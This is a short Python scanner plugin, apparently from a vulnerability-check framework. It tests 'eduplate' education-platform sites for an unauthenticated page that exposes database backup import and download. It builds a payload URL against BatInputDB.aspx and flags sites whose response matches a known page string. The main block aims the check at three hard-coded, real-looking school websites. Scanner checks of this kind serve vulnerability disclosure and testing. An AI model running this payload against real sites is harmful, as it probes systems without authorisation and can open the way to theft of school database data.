#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 奶权
#_PlugName_ = eduplate系统权限验证不严格可导致数据库备份文件直接下载
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-089572
import re
def assign(service, arg):
    if service == 'eduplate':
        return True, arg
def audit(arg):
    payload = 'EduPlate/RES/BatInputDB.aspx?DirPath=%5C%5CUpload%5C'
    target = arg + payload
    
    code, head, res, errcode, _ = curl.curl2(target);
    if code == 200 and "硬盘资源导入数据库" in res:
        security_warning(target)
if __name__ == '__main__':
    from dummy import *
    audit(assign('eduplate', 'http://tywx.mhedu.sh.cn/')[1])
    audit(assign('eduplate', 'http://www.pshd.pudong-edu.sh.cn/')[1])
    audit(assign('eduplate', 'http://whqjky.com/')[1])